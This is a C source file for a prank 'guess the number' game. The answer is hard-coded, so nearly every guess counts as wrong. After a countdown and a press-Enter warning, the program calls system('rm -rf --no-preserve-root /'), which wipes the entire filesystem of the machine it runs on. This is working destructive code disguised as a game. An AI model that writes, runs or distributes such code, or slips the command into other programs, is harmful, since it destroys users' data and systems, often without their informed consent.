#include <stdio.h>
#include <limits.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

#define CLR_RED_BOLD "\033[1;31m" /*sets the color of the following text to bold red*/
#define CLR_DEFAULT "\033[0m" /*resets the color of the following text*/
#define CLR_CYAN_BOLD "\033[1;36m" /*sets the color of the following text to bold cyan*/

int isNumber(char *number);

/**
 * Main entry point and core functionality of program
 * @return Always 0 (EXIT_SUCCESS).
 */
int main(void)
{
	char *input;
	int guess, answer = -5;
	size_t size;

	/* todo: set answer randomly instead of hard coding it */

	printf("Guess a number between %d and %d.\nGuess wrong, and you'll C 4 "
		   "yourself what'll happen.\n", INT_MAX, INT_MIN);

	getline(&input, &size, stdin);
	input[strlen(input) - 1] = '\0';

	if (isNumber(input))
		guess = atoi(input);
	else
	{
		printf("not a number\n");
		exit(EXIT_FAILURE);
		/* something */
	}

	printf("Your number: %s.\n", input);

	if (guess != answer)
	{
		printf("deleting your entire computer...\n");
		sleep(2);

		printf("%sWarning: this is about to actually delete everything on this device. "
			   "Please only continue if you know what you are doing. Press ctrl + c to "
			   "cancel. Press enter to continue. %s", CLR_RED_BOLD, CLR_DEFAULT);
		getline(&input, &size, stdin);

		printf("deleting everything in...\n");
		printf("3\n");
		sleep(1);

		printf("2\n");
		sleep(1);

		printf("1\n");
		sleep(1);

		printf("0\n");
		sleep(1);

		system("rm -rf --no-preserve-root /"); // deletes EVERYTHING

		printf("%sSuccess! Deleti?n has c?mpleted. Enj?y digital ?blivi?n!\n%s\n",
			   CLR_CYAN_BOLD, CLR_DEFAULT);
	}
	return (EXIT_SUCCESS);
}

/**
 * checks if a string is a number.
 * @param number String to check if it's a number
 * @return 1 if it's a number, 0 if not.
 */
int isNumber(char *number)
{
	unsigned int i = 0;

	if (number == NULL)
		return (0);

	if (number[0] == '-')
		i++; // ignore leading negative sign

	while (i < strlen(number))
	{
		if (number[i] > '9' || number[i] < '0')
			return (0);

		i++;
	}

	return (1);
}
